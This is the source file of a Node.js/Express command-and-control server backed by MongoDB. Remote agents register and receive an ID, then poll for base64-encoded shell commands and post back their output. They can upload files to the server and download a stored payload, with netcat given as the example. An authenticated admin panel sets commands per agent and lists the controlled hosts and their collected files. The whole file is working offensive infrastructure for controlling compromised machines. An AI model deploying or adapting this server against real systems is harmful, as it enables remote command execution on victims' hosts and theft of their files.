//------------------REQUIREMENTS-----------------//
require('dotenv').config(); //Allow the script to use environment variables defined in .env file
const mongoose = require('mongoose'); //Object modelling tool for MongoDB, frequently used
const express = require('express'); //Popular back-end middleware for NodeJS to spin up servers
const multer  = require('multer'); //Popular upload/download middleware for NodeJS
const {GridFsStorage} = require('multer-gridfs-storage'); //Storage engine. Supplements multer in interacting with the MongoDB GridFS storage system
const Grid = require('gridfs-stream'); //Implements read-write streams to and from MongoDB
const bodyParser = require("body-parser"); //Required to pull params out of API requests
const md5 = require('md5'); //md5 hasher
const { getDefaultSettings } = require('http2');

const url = process.env.MONGO_LOCAL; //Address of MongoDB (e.g. localhost:27017)

const session = require('express-session'); //Session handling required for authentication
const passport = require('passport'); //Popular authentication middleware for NodeJS + MongoDB
const passportLocalMongoose = require('passport-local-mongoose'); //Required for passport

const app = express();

mongoose.connect(url);

app.use(express.urlencoded({ extended: true}));
//app.use(bodyParser.urlencoded({ extended: true })); //Commonly required, but now integrated with newer versions of Express.

app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: false
}));

app.use(passport.initialize());
app.use(passport.session());


//-------Open connection to MONGODB, assign Storage through Multer/GridFS--------//
let gfs, gridfsBucket;
mongoose.connection.once("open", function() {
    console.log("MongoDB Online");
    gridfsBucket = new mongoose.mongo.GridFSBucket(mongoose.connection.db, {
        bucketName: 'uploads'
    });
  gfs = Grid(mongoose.connection.db, mongoose.mongo);
  gfs.collection('uploads');  
});

const storage = new GridFsStorage({
    url: url,
    options: { useUnifiedTopology: true },
    file: function(request, file) {
       const filename = file.originalname;
        const bucketName = 'uploads';
        return {filename,bucketName};
    }
});

const upload = multer({ storage });

//------------DEFINE SCHEMAS (MONGODB)-----------------//
const guestSchema = new mongoose.Schema ({
    guestID: String,
    ip_address: String,
    time_in: String,
    time_out: String,
    activity: [{timestamp: String, comment: String}],
    filelist: [{file_id: mongoose.Schema.Types.ObjectId, filename: String}],
    latest_cmd: String
});

const whitelistSchema = new mongoose.Schema ({
    guestID: String
});

const commandSchema = new mongoose.Schema ({
    user: String,
    flag: String,
    cmd: String
});

const userSchema = new mongoose.Schema ({
    email: String,
    password: String,
    loginCount: Number
});

//------------PASSPORTJS--------------------------//
userSchema.plugin(passportLocalMongoose);


//--------------------INITIALISE MODELS (MONGODB)-------------------//
const Guest = new mongoose.model("Guest", guestSchema);
const Whitelist = new mongoose.model("Whitelist", whitelistSchema);
const User = new mongoose.model("User", userSchema);
const Command = new mongoose.model("Command", commandSchema);

//------------------PASSPORTJS--------------------------//
passport.use(User.createStrategy());
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());

//---------------------FUNCTIONS LIST-----------------------//
//Bouncer: This function checks the Whitelist if the agent has already registered, and returns TRUE if so.
//Used as a gatekeeper for API interactions.
function Bouncer(guestID, callback){
    console.log("Checking Whitelist for " + guestID + "...");
    Whitelist.findOne(
        { guestID: guestID },
        function(err, doc) {
            if (doc) {
                console.log(guestID + " is in Whitelist")
                callback(true);
            } else {
                console.log(guestID + " is not in Whitelist");
                callback(false);
            }
        }
    );
}

//This function pushes Activity updates as part of the logging regime
function ActivityLogger(guestID, object, callback) {
    Guest.updateOne(
        { guestID: guestID },
        { $push: { activity : object } }, function(err) {
            if (err) {
                console.log(err);
                callback(false);
            } else {
                callback(true)
            }
        }
    );
}

//This function pushes Filelist updates as part of the logging regime
function FileListLogger(guestID, object, callback) {
    Guest.updateOne(
        { guestID: guestID },
        { $push: { filelist : object } }, function(err) {
            if (err) {
                console.log(err);
                callback(false);
            } else {
                callback(true)
            }
        }
    );
}

//The User collection also tracks number of login attempts. Use this to check against the lockout policy.
function LoginUpdate(user, reset, callback) {
    User.findOne({ user: user }, function(err, doc) {
        let newCount;
        if (err) {
            console.log("No user " + user + " found");
        } else {
            if (reset) { newCount = 1 }
            else { newCount = doc.loginCount + 1; }
            User.updateOne({ user: user }, { loginCount: newCount }, function(err, doc) {
            if (err) {
                console.log("Failed to update LoginCount");
                callback(false);
            } else {
                console.log("New LoginCount: " + newCount);
                callback(true);
            }
        });
    }
});
}

//------------------C2 SECTION----------------------------//
app.get("/register", function(request,response){
    //Retrieve IP address from agent, and generate guestID
    let ip = (request.headers['x-forwarded-for'] || '').split(',').pop().trim() || request.socket.remoteAddress;
    console.log("Visit from " + ip);
    let token = Math.random();
    let timestamp = Date(Date.now()).toString();
    let guestID = md5(timestamp + ip + token);
    //Agent booking in at the Pass Office
    let visitLog = "New visitor " + guestID + " from " + ip + "\r\n";
    let update = { timestamp: timestamp, comment: visitLog };
    //Registering agent as a new Guest with MongoDB
    const hello = new Guest({
    guestID: guestID,
    ip_address: ip,
    time_in: timestamp,
    activity: update,
    latest_cmd: "whoami"
    });
    hello.save();
    //Adding agent to whitelist
    const welcome = new Whitelist({
        guestID: guestID
    });
    welcome.save();
    response.send(guestID); //Agent should capture this response and use it as token for API interactions
});

//Upload API
app.post("/uploads/:guestID", function(request, response, next) {
    let guestID = request.params.guestID.toString();
    console.log("Upload API accessed. Searching for " + guestID + "...");
    Bouncer(guestID, function(result) {
            if (result && guestID !== "admin" && guestID !== "TestDummy") { //exclude admin accounts
                next();
            } else {
                response.send("Invalid request \r\n");
            }
    });
    //Use Multer's upload function. 'file' is specified as the param to use in the cURL request, e.g. file=@test.txt
}, upload.single('file'), function(request, response) {
    let guestID = request.params.guestID.toString();
    console.log(request.file);
    let file_id = request.file.id;
    let filename = request.file.filename.toString();
    let update = { file_id: file_id, filename: filename };
    FileListLogger(guestID, update, function(result){
        if (result) {
            console.log("Updated " + guestID + " with " + filename);
        } else {
            console.log("Update to Guestbook filelist failed");
        }
    });
    let timestamp = Date(Date.now()).toString();
    let update_2 = { timestamp: timestamp, comment: "File " + filename + " uploaded"};
    ActivityLogger(guestID, update_2, function(result) {
        if (result) {
            console.log("Updated " + guestID + " with activity update");
        } else {
            console.log("Update to Guestbook activity failed");
        }
    });
    response.send("File Uploaded");
}
);

//Download API (Restricted for specific payload; 
//Agent not required to browse the database for files to download)
app.get("/download/:guestID", function(request, response) {
    let guestID = request.params.guestID;    
    let filename = "binary"; //e.g. netcat binary
    console.log("Requesting for " + filename);
    Bouncer(guestID, function(result) {
        if (result && guestID !== "admin" && guestID !== "TestDummy") {
            gfs.files.findOne({ filename: filename }).then(function(result) { 
                //the findOne method generates a Promise which is evaluated with .then() and hence some usable output to work with.
                if (!result) { 
                    console.log("No file found");
                    response.send("No file found \r\n"); 
                    } else { 
                    const readStream = gridfsBucket.openDownloadStreamByName(filename);
                    readStream.pipe(response);
                    let update = { timestamp: Date(Date.now()).toString(), comment: "File " + filename + " downloaded"};
                    ActivityLogger(guestID, update, function(result){
                        if (result) {
                            console.log("Download record updated in Guestbook");
                        } else {
                            console.log("Update to Guestbook failed");
                        }
                    });
                    }
                });
            } else {
                response.send("Invalid request \r\n");
            }
        });
        });

app.get("/control/:guestID", function(request,response){
    let guestID = request.params.guestID;
    Bouncer(guestID, function(result) {
        if (result && guestID !== "admin" && guestID !== "TestDummy") {
    Command.findOne({ user: "admin" }, function (err, doc) {
        if (doc) {
            console.log("The current control flag is " + doc.flag);
            let flag = doc.flag;
            response.send(flag);
        } else {
            console.log("No flag found, please check if control flag has been set");
            response.send("");
        }
    })
} else {
    console.log(guestID + " not permitted, unable to retrieve control flag"); 
    response.send(""); 
}
});
});

app.get("/stdin/:guestID", function(request,response) {
    let guestID = request.params.guestID;
    var cmd;
    console.log("Request from " + guestID + " for commands...");
    Guest.findOne({ guestID: guestID }, function(err, doc){
        if (doc) {
            cmd = doc.latest_cmd;
            if (cmd !== "") {
                const buff = Buffer.from(cmd, 'utf-8').toString('base64');
                response.send(buff); //Send base64 encoded string
            } else {
                //In case Guestbook doesn't have a cmd for the specific guestID, search Command for any default commands
                Command.findOne({ user: "admin" }, function(err, doc) {
                    if (err) {
                        console.log("No cmds found in Guestbook or Command");
                    } else {
                        const buff_cmd = Buffer.from(doc.cmd, 'utf-8').toString('base64');
                        response.send(buff_cmd);
                        cmd = doc.cmd;
                    }
                });
            }
            let update = { timestamp: Date(Date.now()).toString(), comment: "Cmd: " + cmd };
            ActivityLogger(guestID, update, function(result) {
                if (result) {
                    console.log("Cmd updated in Guestbook");
                } else {
                    console.log("Failed to update cmd in Guestbook");
                }
        console.log("Relaying CMD: " + cmd + " to " + guestID);
    });
        } else {
            console.log("No cmd found for " + guestID);
            response.send("");
        }
    })
});

app.post("/stdout/:guestID", function(request,response) {
    let guestID = request.params.guestID;
    let reply = request.body.stdout;
    const buff = Buffer.from(reply, 'base64').toString('utf-8'); 
    console.log("Reply from " + guestID + ": " + buff);
    let update = { timestamp: Date(Date.now()).toString(), comment: "Stdout: " + buff };
    ActivityLogger(guestID, update, function(result) {
        if (result) {
            console.log("Stdout updated in Guestbook with " + buff);
        } else {
            console.log("Failed to update Stdout in Guestbook");
        }
    })
    response.send("");
});

//Booking Out API
//Agent calls this to de-register itself from the Whitelist after interactions have completed. 
//This ensures the same guestID cannot be reused to interact with the APIs. 
//Investigators will need to run the agent to /register again, which will be logged.
//Note the need to ensure no inadvertent deletion of admin account from whitelist, else will need to re-register admin again
app.get("/bye/:guestID", function(request, response){
    let guestID = request.params.guestID;
    console.log(guestID + " accessing Book Out API...");
    let timestamp = Date(Date.now()).toString();
    let update = { timestamp: timestamp, comment: "Booked out"};
    Bouncer(guestID, function(result){
        if (result && guestID !== "admin" && guestID !== "TestDummy") {
            ActivityLogger(guestID, update, function(result){
                if (result) {
                    Guest.updateOne(
                        { guestID: guestID },
                        { time_out: timestamp }, function (err) {
                            if (err) { console.log (err); }
                        }
                    );
                    console.log("Updated Guestbook with Book Out request");
                } else {
                    console.log("Failed to update Guestbook");
                }
            });
            Whitelist.deleteOne(
                { guestID: guestID }, function(err) {
                    if (err) {
                        console.log(err);
                    } else {
                        console.log("Deleted " + guestID + " from whitelist");
                        response.send("Bye");
                    }
        }
        )
    } else {
        console.log("Invalid request");
    }
});
});

//-------------------ADMIN SECTION----------------------//
//Admin Account registration into MongoDB (Ideally, disable after setting up!)
//Before putting this server into production, register the "admin" account with PassportJS by sending POST request with username ("admin") and password.
//Disable this API where possible, but as mitigation, the code below prevents malicious actors from abusing it 
//to create new admin accounts and access the admin APIs through Passport.
app.post("/register/c2", function(request, response){
    let username = request.body.username;
    let password = request.body.password;
    Bouncer(username, function(result){
        if (!result && username === "admin") {
            User.register({username: username}, password, function(err, user){
                if (err) {
                    console.log(err);
                } else {
                    newCount = 1;
                    User.findOne({ user: "admin" }, function(err, doc) {
                        if (err) {
                            console.log("No admin user found");
                        } else {
                            doc.loginCount = newCount;
                            console.log("New LoginCount: " + doc.loginCount);
                        }
                    })
                    passport.authenticate("local")(request, response, function(){
                        User.updateOne({ user: "admin" }, { loginCount: newCount }, function(err) {
                            if (err) {
                                console.log("Error initialising login count");
                            } else {
                                console.log("Login count succesfully initialised");
                            }
                        });
                        response.send("Registration complete \r\n"); //Remember to retrieve the cookie if using CURL
                        const admin = new Whitelist({ guestID: username });
                        admin.save(); //If forgot password, manually drop this from MongoDB interface and re-register
                        request.logout(function(err){
                            if (err) {
                                console.log("Error logging out");
                            } else {
                                console.log("Logged out successfully");
                            }
                        });
                    })
                }
            })
        } else {
            console.log("Admin account already registered, please contact your administrator");
            response.send("Invalid Request \r\n");
        }
    })
});

//Use this API to login (ensure to register account first)
app.post("/login", function(request,response){
    User.findOne({ user: "admin" }, function(err, doc) {
        if (err) { console.log("No admin user found");
        } else {
            if (doc.loginCount == 8) { 
                response.send("Locked out"); //Lockout Policy
            } else {
                let username = request.body.username;
                let password = request.body.password;
                const user = new User({
                username: username,
                password: password
            });
            request.login(user, function(err){
                if (err) {
                    console.log(err);
                    response.send("Invalid request \r\n");
                } else {
                    //console.log(user);
                    passport.authenticate("local", function(err, user) {
                        if (!user) {
                            let reset = false;
                            LoginUpdate(username, reset, function(result){
                                console.log("Invalid login detected, updated Login Count Tracker");
                            })
                            response.send("Invalid Login \r\n");
                        } else {
                            let reset = true;
                            LoginUpdate(username, reset, function(result) {
                                console.log("Successful Login...Reset Login Tracker");
                            });
                            response.send("Welcome back, " + username + "\r\n");
                        }
                    })(request,response);
                }
            });
        }
    }});
    });

//Use this API to logout / deregister the cookie
app.get("/logout", function(request,response){
    if (request.isAuthenticated()) {
    request.logout(function(err){
        if (err) {
            console.log(err);
        }
    });
    response.send("Logged out \r\n"); 
} else {
    response.send("Unable to logout, please login first \r\n");
}
});

//This requires an asynchronous function as toArray() should be invoked with await.
//From Docs: The await expression causes async function execution to pause until a Promise is settled 
//(that is, fulfilled or rejected), and to resume execution of the async function after fulfillment. 
//When resumed, the value of the await expression is that of the fulfilled Promise.
app.get("/admin/filelist", async function(request, response){
    if (request.isAuthenticated()){
        const cursor = gridfsBucket.find({});
        const arrayDoc = await cursor.toArray(); //get list of all uploaded files into an array
        response.json(arrayDoc); //can parse this json with jq
    } else {
        response.send("Invalid request \r\n");
    }
});

app.get("/admin/logging", async function(request, response) {
    if (request.isAuthenticated()) {
        const logs = await Guest.find({}); //get list of all Guest data
        response.json(logs); //parse this json with jq
    } else {
        console.log("Error reading logs");
    }
});

//Use this API to find the list of agents you can interact with
app.get("/admin/assets", async function(request, response) {
    if (request.isAuthenticated()) {
        const assets = await Whitelist.find({});
        response.json(assets);
    } else {
        console.log("Error reading Whitelist");
    }
    });

app.get("/admin/download/:filename", function(request, response) {
    if (request.isAuthenticated()) {  
        let filename = request.params.filename;
        console.log("Requesting for " + filename);
        gfs.files.findOne({ filename: filename }).then(function(result) { 
        //the findOne method generates a Promise which is evaluated with .then() and hence some usable output to work with.
            if (!result) { 
                console.log("No file found");
                response.send("No file found \r\n"); 
                } else { 
                const readStream = gridfsBucket.openDownloadStreamByName(filename);
                readStream.pipe(response);
                }
            });
        } else {
            response.send("Invalid request \r\n");
        }
    });

app.get("/admin/cmd/flag/:flag", function(request,response){
    if (request.isAuthenticated()) {
        let flag = request.params.flag;
        if (!(flag === "0" || flag === "1")) { 
            console.log("Requested flag is " + flag); 
            response.send("Invalid Request \r\n"); 
        } else {
        Command.updateOne({ user: "admin" }, { flag: flag }, function(err) {
            if (err) {
                console.log("Error updating Flag");
            } else {
                console.log("Flag update successful");
            }
        });
        console.log("Command flag has been updated to " + flag);
        response.send("Flag has been updated to " + flag + "\r\n");
    }
} else {
        response.send("Unauthenticated Request \r\n");
    }
})

app.post("/admin/cmd/update", function(request,response){
    if (request.isAuthenticated()) {
        let updated_cmd = request.body.cmd;
        //const buff = Buffer.from(updated_cmd, 'utf-8').toString('base64'); //Leave commented out unless converting to base64 is desired in your implementation
        let guestID = request.body.guestID;
        Guest.updateOne({ guestID: guestID }, { latest_cmd: updated_cmd }, function(err) {
            if (err) {
                console.log("Failed to update cmd for " + guestID);
                response.send("");
            } else {
                console.log("Updated cmd for " + guestID);
                response.send("Cmd update OK");
            }
        })
    } else {
        console.log("Unauthenticated access to Command regime");
        response.send("Invalid Request \r\n")
    }
});

//--------------DIAGNOSTIC APIS---------------------//
//Diagnostic API to create TestDummy user
app.get("/admin/activity/createTestDummy", function(request,response) {
    if (request.isAuthenticated()) {
        let guestID = "TestDummy";
        let timestamp = Date(Date.now()).toString();
        let ip_address = "Test_IP";
        let comment = "Diagnostics";
        let file_id = "TestFileID";
        let filename = "TestFilename";
        let update = { timestamp: timestamp, comment: comment};
        let update_2 = { filelist: file_id, filename: filename};
        Bouncer(guestID, function(result){
            if (result) {
                console.log("TestDummy already created, no further action");
            } else {
                const auditor = new Guest({
                guestID: guestID,
                ip_address: ip_address,
                time_in: timestamp,
                activity: update,
                filelist: update_2
            });
                auditor.save();
                const auditorWelcome = new Whitelist({ guestID: guestID });
                auditorWelcome.save();
                console.log("TestDummy created and updated Whitelist")
            }
        });
} else {
    console.log("Invalid Request");
}
});


//Diagnostic API to check logging function on TestDummy
app.get("/admin/activity/", function(request, response) {
    if (request.isAuthenticated()) {
        let guestID = "TestDummy";
        let timestamp = Date(Date.now()).toString();
        let comment = "Diagnostics_Update";
        let file_id = "TestFileID_Update";
        let filename = "TestFilename_Update";
        let update = { timestamp: timestamp, comment: comment};
        let update_2 = { filelist: file_id, filename: filename};
        Bouncer(guestID, function(result){
            if (result) {
                ActivityLogger(guestID, update, function(result) {
                    if (result) {
                    console.log("ActivityLogger Success");
                    } else {
                    console.log("ActivityLogger Fail");
                }
            });
                FileListLogger(guestID, update_2, function(result) {
                    if (result) {
                    console.log("FileListLogger Success");
                    } else {
                    console.log("FileListLogger Fail");
                }
            });
            response.send("Test log updated \r\n");
        } else {
            console.log("TestDummy not in Whitelist, please run /admin/activity/createTestDummy");
            response.send("Unable, please check Whitelist for permissions \r\n");
        }
    })
} else {
    console.log("Invalid Request"); 
}
});

//Diagnostic API to check validity of login cookie
app.get("/admin/logincheck", function(request, response){
    if (request.isAuthenticated()){
        response.send("Cookie is valid, proceed to use \r\n");
    } else {
        response.send("Rejected, have you logged in? \r\n");
    }
});

//API to initialise Commands
app.get("/admin/createCommand", function(request, response){
    if(request.isAuthenticated()){
        Command.findOne(
            { user: "admin" },
            function(err, doc) {
                if (doc) {
                    console.log("Command regime exists, no further action")
                    response.send("Invalid Request \r\n");
                } else {
                    console.log("Initialising Command regime");
                    const command = new Command({
                    user: "admin",
                    flag: 1,
                    cmd: "whoami"
                });
                command.save();
                console.log("Command regime initialised");
                response.send("Command regime initialised \r\n")
                }
            }
        );
    } else {
        response.send("Invalid Request \r\n");
    }
});

//---------------START THE SERVER----------------------//
app.listen(process.env.PORT || 4000, function () {
    console.log("Server is running!");
});
